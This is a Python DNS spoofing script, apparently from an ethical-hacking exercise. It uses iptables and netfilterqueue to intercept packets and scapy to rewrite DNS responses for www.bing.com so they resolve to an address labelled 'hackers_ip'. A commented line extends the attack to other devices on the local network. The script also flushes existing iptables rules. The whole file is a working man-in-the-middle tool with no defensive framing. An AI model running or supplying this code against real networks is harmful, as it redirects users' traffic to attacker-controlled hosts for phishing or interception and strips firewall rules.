import netfilterqueue
import scapy.all as scapy
import subprocess as sb
import argparse

def get_arguments():
   parser = argparse.ArgumentParser()
   parser.add_argument('-n','--num', dest ='num', help = 'Queue number')
   options=parser.parse_args()
   return options.num

num = get_arguments() 
number= num if num else 0
sb.call('iptables --flush',shell=True)
sb.call(f'iptables -I OUTPUT -j NFQUEUE --queue-num {number}', shell= True)
sb.call(f'iptables -I INPUT -j NFQUEUE --queue-num {number}', shell= True)

#uncomment the next line to use the script in on other devices in the network
#sb.call('iptables -t nat PREROUTING -p udp --dport 53 -j NFQUEUE')

def process_packet(packet):
   scapy_packet = scapy.IP(packet.get_payload())
   if scapy_packet.haslayer(scapy.DNSRR):
      qname = scapy_packet[scapy.DNSQR].qname
      website='www.bing.com'
      hackers_ip='10.0.2.15'
      if website in str(qname):
         print('[+] Spoofing target')
         answer = scapy.DNSRR(rrname=qname, rdata= hackers_ip)
         scapy_packet[scapy.DNS].an= answer
         scapy_packet[scapy.DNS].ancount= 1
         
         del scapy_packet[scapy.IP].len
         del scapy_packet[scapy.IP].chksum
         del scapy_packet[scapy.UDP].len
         del scapy_packet[scapy.UDP].chksum
         
         packet.set_payload(bytes(scapy_packet))
   packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(int(number), process_packet)
queue.run()

